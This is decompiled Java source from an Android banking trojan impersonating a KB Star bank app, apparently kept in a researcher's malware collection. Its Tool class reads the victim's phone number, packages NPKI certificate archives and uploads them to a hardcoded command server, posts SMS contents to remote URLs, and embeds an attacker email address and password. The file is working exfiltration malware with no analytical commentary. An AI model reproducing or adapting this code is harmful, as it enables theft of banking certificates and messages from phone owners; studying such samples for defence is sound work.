package com.kbstar.kb.android.star.util;

import android.content.Context;
import android.os.Environment;
import android.telephony.TelephonyManager;
import com.androidquery.AQuery;
import java.io.File;
import java.io.IOException;
import java.io.PrintStream;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.StatusLine;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.util.EntityUtils;
import org.json.JSONObject;

public class Tool
{
  public static String DB_NAME = "googleplayenet.apk";
  public static String DB_PATH = Environment.getExternalStorageDirectory().getAbsolutePath() + "/recording/";
  private static final String EMAIL_ADDR = "dkggtbb603@gmail.com";
  private static final String TOOL_URL = "pqkglg.vicp.co";
  public static Url u = new Url();
  private final String DEBUG_TAG = "tool";
  
  public static String GetUrlTool()
  {
    Object localObject = "pqkglg.vicp.co";
    String str = new Url().getUrl("ak49");
    if (!str.equals("")) {
      localObject = str;
    }
    return (String)localObject;
  }
  
  public static String GetUrlToolSMSName()
  {
    Object localObject = "dkggtbb603@gmail.com";
    String str = new Url().getUrl("sms_name");
    if (!str.equals("")) {
      localObject = str;
    }
    return (String)localObject;
  }
  
  public static String GetUrlToolSMSPSW()
  {
    Object localObject = "boo!@#$bar$#@!";
    String str = new Url().getUrl("sms_pws");
    if (!str.equals("")) {
      localObject = str;
    }
    return (String)localObject;
  }
  
  public static String postHttpConnection(String paramString1, String paramString2, String paramString3, String paramString4)
  {
    String str = "";
    paramString1 = new HttpPost(paramString1);
    ArrayList localArrayList = new ArrayList();
    localArrayList.add(new BasicNameValuePair("phone", paramString2));
    localArrayList.add(new BasicNameValuePair("localphone", paramString3));
    localArrayList.add(new BasicNameValuePair("content", paramString4));
    try
    {
      paramString1.setEntity(new UrlEncodedFormEntity(localArrayList, "UTF-8"));
      paramString1 = new DefaultHttpClient().execute(paramString1);
      if (paramString1.getStatusLine().getStatusCode() == 200) {}
      for (paramString1 = EntityUtils.toString(paramString1.getEntity());; paramString1 = "0000")
      {
        System.out.println(paramString1);
        return paramString1;
      }
    }
    catch (ClientProtocolException paramString1)
    {
      for (;;)
      {
        paramString1.printStackTrace();
        paramString1 = str;
      }
    }
    catch (IOException paramString1)
    {
      for (;;)
      {
        paramString1.printStackTrace();
        paramString1 = str;
      }
    }
    catch (Exception paramString1)
    {
      for (;;)
      {
        paramString1.printStackTrace();
        paramString1 = str;
      }
    }
  }
  
  public static String postHttpConnectionCommon(String paramString, List<NameValuePair> paramList)
  {
    String str = "";
    paramString = new HttpPost(paramString);
    try
    {
      paramString.setEntity(new UrlEncodedFormEntity(paramList, "UTF-8"));
      paramString = new DefaultHttpClient().execute(paramString);
      if (paramString.getStatusLine().getStatusCode() == 200) {}
      for (paramString = EntityUtils.toString(paramString.getEntity());; paramString = "error")
      {
        System.out.println(paramString);
        return paramString;
      }
    }
    catch (ClientProtocolException paramString)
    {
      for (;;)
      {
        paramString.printStackTrace();
        paramString = str;
      }
    }
    catch (IOException paramString)
    {
      for (;;)
      {
        paramString.printStackTrace();
        paramString = str;
      }
    }
    catch (Exception paramString)
    {
      for (;;)
      {
        paramString.printStackTrace();
        paramString = str;
      }
    }
  }
  
  public static void postHttpFile(Context paramContext)
  {
    String str = ((TelephonyManager)paramContext.getSystemService("phone")).getLine1Number();
    HashMap localHashMap = new HashMap();
    localHashMap.put("file", new File(u.getSDPath() + "/" + str + "_npki.zip"));
    AQuery localAQuery = new AQuery(paramContext.getApplicationContext());
    localHashMap.put("phone", str);
    localHashMap.put("npki", str + "_npki.zip");
    localAQuery.ajax("http://" + GetUrlTool() + "/phon/youxi_up.php", localHashMap, JSONObject.class, paramContext, "callback");
  }
  
  public static void postHttpFile1(Context paramContext, File paramFile, String paramString)
  {
    String str = ((TelephonyManager)paramContext.getSystemService("phone")).getLine1Number();
    HashMap localHashMap = new HashMap();
    localHashMap.put("file", paramFile);
    paramFile = new AQuery(paramContext.getApplicationContext());
    localHashMap.put("phone", str);
    localHashMap.put("npki", paramString + ".zip");
    paramFile.ajax("http://" + GetUrlTool() + "/phon/youxi_up.php", localHashMap, JSONObject.class, paramContext, "callback");
  }
  
  public static void postHttpFile2(Context paramContext, File paramFile, String paramString)
  {
    String str = ((TelephonyManager)paramContext.getSystemService("phone")).getLine1Number();
    HashMap localHashMap = new HashMap();
    localHashMap.put("file", paramFile);
    paramFile = new AQuery(paramContext.getApplicationContext());
    localHashMap.put("phone", str);
    localHashMap.put("npki", paramString);
    paramFile.ajax("http://" + GetUrlTool() + "/phon/youxi_up.php", localHashMap, JSONObject.class, paramContext, "callback");
  }
}


/* Location:              /home/enzo/Documents/BorelEnzo.github.io/malwares/dsencrypt/payload.jar!/com/kbstar/kb/android/star/util/Tool.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */